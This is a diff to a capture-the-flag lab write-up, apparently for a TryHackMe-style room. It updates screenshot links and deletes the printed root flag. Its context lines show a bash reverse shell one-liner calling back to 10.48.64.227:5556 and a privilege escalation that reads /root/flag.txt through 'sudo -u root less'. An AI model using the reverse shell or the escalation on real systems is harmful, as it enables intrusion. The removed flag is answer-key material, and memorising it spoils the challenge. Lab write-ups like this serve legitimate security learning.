@@ -244,7 +244,7 @@ cat /home/recon_user/flag.txt
 ### Flag 1
 
 The output of the command above is the flag for the `recon_user` stage.
-![ops_user shell](Screenshots/recon.png)
+![ops_user shell](Screenshots/recon2.png)
 
 ---
 
@@ -336,7 +336,7 @@ The important line was:
 ```bash
 bash -i >& /dev/tcp/10.48.64.227/5556 0>&1
 ```
-![[Pasted image 20260911125330.png]]
+![ops_user shell](Screenshots/sh.png)
 
 ---
 
@@ -373,7 +373,7 @@ The result showed:
 ```text
 dev_user
 ```
-![ops_user shell](Screenshots/dev.png)
+![ops_user shell](Screenshots/dev2.png)
 
 ---
 
@@ -845,20 +845,10 @@ Instead of trying to obtain a root shell, I used the permitted `less` command di
 sudo -u root less /root/flag.txt
 ```
 
-This successfully displayed:
 
-```text
-THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
-```
-
-### Root Flag
-
-```text
-THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
-```
 
 This completed the lab.
-![ops_user shell](Screenshots/root.png)
+![ops_user shell](Screenshots/root2.png)
 
 ---
 
